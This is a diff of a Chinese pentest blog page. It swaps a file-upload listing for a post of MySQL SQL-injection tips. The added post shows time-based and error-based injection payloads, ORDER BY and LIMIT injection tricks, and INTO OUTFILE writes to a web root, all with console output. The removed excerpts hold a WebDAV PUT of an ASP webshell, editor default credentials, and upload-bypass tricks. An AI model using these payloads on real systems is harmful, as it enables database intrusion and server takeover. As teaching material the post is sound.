@@ -3,9 +3,9 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>文件上传 - Reber's Blog</title>
+    <title>SQL注入的一些tips - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,python,php,linux">
-    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
+    <meta name="description" content="记录一些非常见的注入手法，或者说是mysql的一些特性">
     <meta name="author" content="reber">
 
     
@@ -75,228 +75,343 @@
     </ul>
 </div>
 
-    
+
     <div class="main">
         <div class="left">
-            <h2 style="padding:0px 0px 15px 0px;">-- 文件上传 --</h2>
+            <div>
+                <h2>SQL注入的一些tips</h2>
+                
+                <div class="post-meta">
+                    <div style="padding:5px 5px 2px 5px;">
+                        <i class="fa fa-calendar fa-fw"></i>
+                        <time>2018-05-23</time>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
+
+                    
+
+                    
+                        
+                        
+                        
+                            <i class="fa fa-folder fa-fw"></i>
+                            
+                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                            
+                        
+                        
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                        
+                        
+                        
+                            <i class="fa fa-tags fa-fw"></i>
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                            
+                        
+                        
+                    </div>
+                </div>
+                
+            </div>
             <div class="content">
                 
-                    
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/file-upload-editor-upload-vulnerability/">文件上传之文本编辑器上传漏洞</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-21</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
                 
 
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
+<p>环境：MySQL 5.5.47</p>
 
+<h3 id="0x00-基于时间的注入payload">0x00 基于时间的注入payload</h3>
+
+<pre><code>mysql&gt; select if((select database()) like &quot;rte%&quot;,sleep(2),null);
++---------------------------------------------------+
+| if((select database()) like &quot;rte%&quot;,sleep(2),null) |
++---------------------------------------------------+
+|                                                 0 |
++---------------------------------------------------+
+1 row in set (2.00 sec)
+
+mysql&gt; select if((select database())=&quot;rteaaa&quot;,sleep(2),666);
++-----------------------------------------------+
+| if((select database())=&quot;rtest1&quot;,sleep(2),666) |
++-----------------------------------------------+
+|                                           666 |
++-----------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select if((select database())=&quot;rtest&quot;,sleep(2),666);
++----------------------------------------------+
+| if((select database())=&quot;rtest&quot;,sleep(2),666) |
++----------------------------------------------+
+|                                            0 |
++----------------------------------------------+
+1 row in set (2.00 sec)
+</code></pre>
+
+<h3 id="0x01-注入点在order-by后面">0x01 注入点在Order by后面</h3>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt';
+Query OK, 1 row affected (0.01 sec)
+</code></pre>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~msg~'
+</code></pre>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: '~rtest~'
+</code></pre>
+
+<pre><code>mysql&gt; select name from msg where id&gt;1 order by if(1=1,1,(select 1 union select 2));
++----------+
+| name     |
++----------+
+| xiaohong |
++----------+
+1 row in set (0.00 sec)
+mysql&gt; select name from msg where id&gt;1 order by if(1=2,1,(select 1 union select 2));
+ERROR 1242 (21000): Subquery returns more than 1 row
+
+mysql&gt; select name from msg where id&gt;1 order by (select case when(2&gt;1) then 1 else 1*(select 1 union select 2)end)=1;
++----------+
+| name     |
++----------+
+| xiaohong |
++----------+
+1 row in set (0.00 sec)
+mysql&gt; select name from msg where id&gt;1 order by (select case when(2&lt;1) then 1 else 1*(select 1 union select 2)end)=1;
+ERROR 1242 (21000): Subquery returns more than 1 row
+</code></pre>
+
+<h3 id="0x02-注入点在limit后面">0x02 注入点在limit后面</h3>
+
+<ul>
+<li>limit前面没有order by可以使用union、analyse()</li>
+</ul>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 union select 1,2,3;
++----+------+---------+
+| id | name | content |
++----+------+---------+
+|  1 | 2    | 3       |
++----+------+---------+
+1 row in set (0.01 sec)
+
+mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse();
++-------------------+---------------+---------------+------------+------------+
+| Field_name        | Min_value     | Max_value     | Min_length | Max_length |
++-------------------+---------------+---------------+------------+------------+
+| rtest.msg.name    | xiaohong      | xiaohong      |          8 |          8 |
+| rtest.msg.content | I have a cat. | I have a cat. |         13 |         13 |
++-------------------+---------------+---------------+------------+------------+
+
+------------------+-------+-------------------------+------+--------------------+
+ Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype  |
+------------------+-------+-------------------------+------+--------------------+
+     0 |     0 | 8.0000                  | NULL | ENUM('xiaohong') NOT NULL     |
+     0 |     0 | 13.0000                 | NULL | ENUM('I have a cat.') NOT NULL|
+------------------+-------+-------------------------+------+--------------------+
+2 rows in set (0.00 sec)
+</code></pre>
+
+<ul>
+<li>limit前面有order by则不可以使用union、analyse()</li>
+</ul>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
+
+mysql&gt; select id,name,content from msg where id&gt;1 order by name limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
+</code></pre>
+
+<h3 id="0x03-根据报错得到数据库名-表名-列名">0x03 根据报错得到数据库名、表名、列名</h3>
+
+<pre><code>#得到数据库名为rtest
+mysql&gt; select id,name,content from msg where id=2-a();
+ERROR 1305 (42000): FUNCTION rtest.a does not exist
+
+#得到表名为msg
+mysql&gt; select id,name,content from msg where id=2 and polygon(1);
+ERROR 1367 (22007): Illegal non geometric '1' value found during parsing
+mysql&gt; select id,name,content from msg where id=2 and polygon(id);
+ERROR 1367 (22007): Illegal non geometric '`rtest`.`msg`.`id`' value found during parsing
+
+#得到列名为id、name、content、useragent
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b)c);
+ERROR 1060 (42S21): Duplicate column name 'id'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id))c);
+ERROR 1060 (42S21): Duplicate column name 'name'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name))c);
+ERROR 1060 (42S21): Duplicate column name 'content'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content))c);
+ERROR 1060 (42S21): Duplicate column name 'useragent'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content,useragent))c);
+ERROR 1241 (21000): Operand should contain 1 column(s)
+</code></pre>
+
+<h3 id="0x04-mysql的隐式转换">0x04 MySQL的隐式转换</h3>
+
+<ul>
+<li><p>官方隐式转换规则</p>
+
+<ul>
+<li>两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 &lt;=&gt; 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换</li>
+<li>两个参数都是字符串，会按照字符串来比较，不做类型转换</li>
+<li>两个参数都是整数，按照整数来比较，不做类型转换</li>
+<li>十六进制的值和非数字做比较时，会被当做二进制串</li>
+<li>有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp</li>
+<li>有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</li>
+<li>所有其他情况下，两个参数都会被转换为浮点数再进行比较</li>
+</ul></li>
+
+<li><p>数字和字符进行运算时会转换为double类型</p></li>
+</ul>
+
+<pre><code>mysql&gt; select 2+'4'; #数字和字符会转换为数字
++-------+
+| 2+'4' |
++-------+
+|     6 |
++-------+
+1 row in set (0.00 sec)
+</code></pre>
+
+<pre><code>mysql&gt; select 'a'+'55'; #字符和字符会转换为数字
++----------+
+| 'a'+'55' |
++----------+
+|       55 |
++----------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; select '33'+'32d11a';
++-----------+
+| '33'+'3d' |
++-----------+
+|        65 |
++-----------+
+1 row in set, 1 warning (0.00 sec)
+</code></pre>
+
+<ul>
+<li>concat()函数将数字转换为字符</li>
+</ul>
+
+<pre><code>mysql&gt; select concat(3,'test'); #前面的数字1被转换为字符
++------------------+
+| concat(3,'test') |
++------------------+
+| 3test            |
++------------------+
+1 row in set (0.00 sec)
+</code></pre>
+
+<ul>
+<li>name类型为string，查询条件为int 0时可以查询</li>
+</ul>
+
+<pre><code>mysql&gt; desc msg;
++-----------+---------------+------+-----+---------+----------------+
+| Field     | Type          | Null | Key | Default | Extra          |
++-----------+---------------+------+-----+---------+----------------+
+| id        | int(11)       | NO   | PRI | NULL    | auto_increment |
+| name      | varchar(30)   | NO   |     | NULL    |                |
+| content   | varchar(1024) | NO   |     | NULL    |                |
+| useragent | varchar(1024) | NO   |     | NULL    |                |
++-----------+---------------+------+-----+---------+----------------+
+4 rows in set (0.01 sec)
+
+mysql&gt; select id,name,content from msg where id=1 and name=0;
++----+----------+--------------+
+| id | name     | content      |
++----+----------+--------------+
+|  1 | xiaoming | hello world. |
++----+----------+--------------+
+1 row in set, 2 warnings (0.00 sec)
+
+mysql&gt; show warnings;
++---------+------+----------------------------------------------+
+| Level   | Code | Message                                      |
++---------+------+----------------------------------------------+
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
++---------+------+----------------------------------------------+
+2 rows in set (0.00 sec)
+
+</code></pre>
+
+<pre><code>mysql&gt; select id,name,content from msg;
++----+----------+---------------+
+| id | name     | content       |
++----+----------+---------------+
+|  1 | xiaoming | hello world.  |
+|  2 | xiaohong | I have a cat. |
+|  3 | 55lihua  | ni hao        |
++----+----------+---------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; select id,name,content from msg where name='li'+'55';
++----+---------+---------+
+| id | name    | content |
++----+---------+---------+
+|  3 | 55lihua | ni hao  |
++----+---------+---------+
+1 row in set, 4 warnings (0.01 sec)
+
+mysql&gt; show warnings;
++---------+------+----------------------------------------------+
+| Level   | Code | Message                                      |
++---------+------+----------------------------------------------+
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'li'       |
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaohong' |
+| Warning | 1292 | Truncated incorrect DOUBLE value: '55lihua'  |
++---------+------+----------------------------------------------+
+4 rows in set (0.00 sec)
+</code></pre>
+
+<p><br></p>
+
+<h4 id="reference-侵删">Reference(侵删)：</h4>
+
+<ul>
+<li><a href="https://www.cnblogs.com/Le30bjectNs11/p/4341207.html">https://www.cnblogs.com/Le30bjectNs11/p/4341207.html</a></li>
+<li><a href="https://www.cnblogs.com/rollenholt/p/5442825.html">https://www.cnblogs.com/rollenholt/p/5442825.html</a></li>
+</ul>
+
+                
+                <div style="padding:10px 1px;">
+                    <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
+                    <script>
+                        var link = decodeURI(window.location.href);
+                        var url = '<a href="' + link + '">'+link+'</a>';
+                        document.write(url);
+                    </script>
+                </div>
+
+                
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
     
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x00 文本编辑器 常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。
-0x01 FCKeditor 下面以FCKeditor(现名为CKEditor)为例：
-1、敏感信息暴漏 * 查看版本信息 /FCKeditor/editor/dialog/fck_about.html * 默认上传页面 /FCKeditor/editor/filemanager/browser/default/browser.html /FCKeditor/editor/filemanager/browser/default/connectors/test.html /FCKeditor/editor/filemanager/upload/test.html /FCKeditor/editor/filemanager/connectors/test.html /FCKeditor/editor/filemanager/connectors/uploadtest.html * 其他敏感文件 /FCKeditor/editor/filemanager/connectors/aspx/connector.html /FCKeditor/editor/filemanager/connectors/asp/connector.html /FCKeditor/editor/filemanager/connectors/php/connector.php 2、黑名单策略错误 FCKeditor&lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名 3、任意文件上传漏洞 FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行， 在form中的action=&quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; 即可，然后上传  0x02 eWebEditor 1、默认后台 2.80以前为：ewebeditor/admin_login.asp 2.80以后为：admin/login.asp 2、默认账号密码 admin admin888 3、数据库地址 默认数据库地址 ewebeditor/db/ewebeditor.mdb 常用数据库地址 ewebeditor/db/ewebeditor.asa ewebeditor/db/ewebeditor.asa ewebeditor/db/#ewebeditor.asa ewebeditor/db/#ewebeditor.mdb ewebeditor/db/!@#ewebeditor.asp ewebeditor/db/ewebeditor1033.mdb asp asa为后缀的数据库下载下来后改为mdb  
-Reference(侵删)：  http://navisec.it/编辑器漏洞手册/  
-    </p>
-
+    <a href="http://wyb0.com/posts/thinkphp5-where-function/"><i class="fa fa-chevron-left"></i></a>
     
-</article>
-
-
-                
-                    
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/file-upload-simple-to-bypass/">文件上传之绕过上传漏洞</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-20</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
+  </div>
+  <div class="pure-u-10-24">
     
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 一般防止上传漏洞手法 1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证 //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少 //服务器开销，而服务端验证才可以真正防御攻击者。 2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法  0x01 客户端检测 客户端验证代码形如下：
-&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;图片上传&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function checkFile(){ var flag = false; var str = document.getElementById(&quot;file&quot;).value; str = str.substring(str.lastIndexOf('.') + 1); var arr = new Array('png','bmp','gif','jpg'); for (var i=0;i&lt;arr.length;i++){ if(str==arr[i]){ flag = true; } } if(!flag){ alert('文件不合法！'); } return flag; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; onsubmit=&quot;checkFile()&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;&lt;br/&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;submit&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;  接收文件的脚本upload.
-    </p>
-
+    <nav class="prev">
+      <a href="http://wyb0.com/posts/thinkphp5-where-function/">ThinkPHP5的where函数</a>
+    </nav>
     
-    <footer>
-        <a href="/posts/file-upload-simple-to-bypass/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
     
-</article>
-
-
-                
-                    
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/file-upload-parse-vulnerability/">文件上传之解析漏洞</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-20</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
     
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 解析漏洞 文件上传漏洞通常与Web容器的解析漏洞配合利用 常见Web容器有IIS、Nginx、Apache、Tomcat等  0x01 IIS解析漏洞 IIS6.0在解析文件时存在以下两个解析漏洞
-1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。 2、当文件名为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。  WebDav漏洞
- WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若 支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。 测试步骤如下： 1）通过OPTIONS探测服务器所支持的HTTP方法 请求： OPTIONS / HTTP/1.1 Host: www.xxxx.com 2)通过PUT方法向服务器上传shell 请求： PUT /a.txt HTTP/1.1 Host: www.xxxx.com Content-Length: 30 &lt;%eval request(&quot;chopper&quot;) %&gt; 3)通过Move或Copy方法改名 请求： COPY /a.txt HTTP/1.1 Host: www.xxxx.com Destination: http://www.xxxx.com/cmd.asp 4)用DELETE方法删除文件 请求： DELETE /a.txt HTTP/1.1 Host: www.xxxx.com 注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞  0x02 Apache解析漏洞 在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件&quot;/conf/mime.types&quot;中配置Apache可以识别的文件名  0x03 Nginx解析漏洞 对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php  0x04 PHP CGI解析漏洞 当php的配置文件中的选项cgi.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/file-upload-parse-vulnerability/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-                
-                    
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/file-upload-vulnerabilities/">文件上传漏洞</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-20</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x00 文件上传漏洞 当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的 脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。  0x01 权限 1. 后台权限：登陆了后台，可以进行一些操作、配置 2. 网站权限：获得了webshell，可以进行查看源代码等操作 3. 服务器权限：可以对服务器进行任意操作  0x02 漏洞分类 1. 配置不当可直接上传shell HTTP的PUT方法开启了 2. 文件解析漏洞导致文件执行 Web容器解析漏洞 3. 本地文件上传限制被绕过 BurpSuite抓包修改即可绕过 4. 服务端过滤不严或被绕过 使用了黑名单过滤 5. 文件路径截断上传 00截断等 6. 开源编辑器上传漏洞 如CKEditor(FCKeditor的新版)、eWebEditor的漏洞  0x03 利用条件 1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径 2. 其次,用户能从web访问这个文件 3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败  0x04 漏洞挖掘 1. 查找上传点，如图片、附件、头像的上传等 2. 找类似upload的目录、类似upload.php的文件 3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等  0x05 常见可执行文件后缀 可用于绕过： php php2 php3 php5 phtml asp aspx ascx ashx cer asa jsp jspx jspf  
-    </p>
-
-    
-</article>
-
-
-                
-
-                
+  </div>
+</div>
 
 
             </div>
@@ -639,7 +754,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         </div>
     </div>
 
-    <br><br>
+    <br>
     
 <div class="foot">
     <div class="copyright">
@@ -731,3 +846,4 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
 
 </body>
 </html>
+
